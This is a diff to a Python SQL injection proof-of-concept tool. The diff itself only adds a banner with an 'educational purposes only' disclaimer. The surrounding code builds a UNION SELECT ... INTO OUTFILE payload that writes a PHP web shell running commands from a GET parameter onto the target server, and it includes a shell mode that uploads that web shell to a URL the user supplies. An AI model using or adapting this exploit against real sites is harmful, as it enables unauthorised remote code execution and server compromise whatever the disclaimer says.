@@ -4,6 +4,14 @@ import time
 import argparse
 import datetime
 
+banner = """
+SQL Injection Proof of Concept Tool
+===================================
+Author: J3r1ch0123
+Version: 1.0
+Disclaimer: This tool is for educational purposes only. Do not use it to attack any system without explicit permission from the system owner.
+"""
+
 def output(outfile, data):
     dt = datetime.datetime.now().isoformat()
     with open(outfile, "a") as theoutfile:
@@ -49,6 +57,7 @@ def exploit(url, param, payload):
 def overwrite_file(url, param, filepath):
     print(f"[+] Attempting to overwrite {filepath}...\n")
     payload = f"' union select 1, '<?php system($_GET[\"cmd\"]); ?>' into outfile '{filepath}' #"
+
     if exploit(url, param, payload):
         print(f"[+] Successfully overwritten {filepath}...\n")
     else:
@@ -77,7 +86,7 @@ def shell_mode(url, param):
     print("[-] Webshell not uploaded. Check output.txt for analysis...")
 
 def main():
-    parser = argparse.ArgumentParser(description="SQL Injection PoC")
+    parser = argparse.ArgumentParser(description=banner)
     parser.add_argument("url", help="Vulnerable URL (e.g. https://example.com/vulnerable_uri)")
     parser.add_argument("payloads", default="payloads.txt", help="File containing payloads")
     parser.add_argument("--param", default="?id=2", help="Parameter to test (default: ?id=2)")
@@ -91,6 +100,7 @@ def main():
     if args.overwrite:
         overwrite_file(url, args.param, args.overwrite)
 
+    print(banner)
     payloads = []
     with open(args.payloads, "r") as thepayloads:
         for line in thepayloads:
@@ -103,3 +113,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
